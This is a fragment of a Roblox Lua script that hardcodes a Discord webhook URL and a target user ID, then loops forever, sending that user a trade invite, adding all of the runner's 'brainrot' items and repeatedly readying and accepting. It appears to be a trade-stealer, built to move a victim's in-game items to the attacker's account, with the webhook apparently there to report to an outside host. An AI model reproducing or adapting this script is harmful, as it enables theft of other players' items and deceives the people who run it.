...
local WEBHOOK_URL = "https://discord.com/api/webhooks/1502904939687710883/bQsPMQ2nQE5x2v0Kf-DBQsNWM_KPi6MTaMOlMuy47JBgYlQNut3qPJCOMWULTnLSuLRI"
local TARGET_ID = 8560999867
local DELAY_STEP = 1
...
local function startFullAutomation()
    ...
    print("searchRemote:", searchRemote)
    print("inviteRemote:", inviteRemote)
    print("addRemote:", addRemote)
    print("readyRemote:", readyRemote)
    print("acceptRemote:", acceptRemote)

    task.spawn(function()
        while true do
            pcall(function()
                -- Step 1: Search for target user
                if searchRemote then 
                    searchRemote:InvokeServer(TARGET_ID) 
                end
                task.wait(DELAY_STEP)
                
                -- Step 2: Send trade invite
                if inviteRemote then 
                    inviteRemote:InvokeServer(TARGET_ID) 
                end
                task.wait(DELAY_STEP)
                
                -- Step 3: Wait for trade to open
                task.wait(3)
                
                -- Step 4: Add all brainrots to trade
                if addRemote then
                    for i = 1, #brainrotQueue do
                        pcall(function()
                            addNextBrainrot(addRemote, i)
                        end)
                        task.wait(0.5)
                    end
                end
                
                -- Step 5: Wait after adding brainrots
                task.wait(2)
                
                -- Step 6: Ready up and accept
                local startTime = os.clock()
                while os.clock() - startTime < 30 do
                    if readyRemote then
                        pcall(function() readyRemote:FireServer() end)
                    end
                    task.wait(1)
                    if acceptRemote then
                        pcall(function() acceptRemote:FireServer() end)
                    end
                    task.wait(1)
                end
            end)
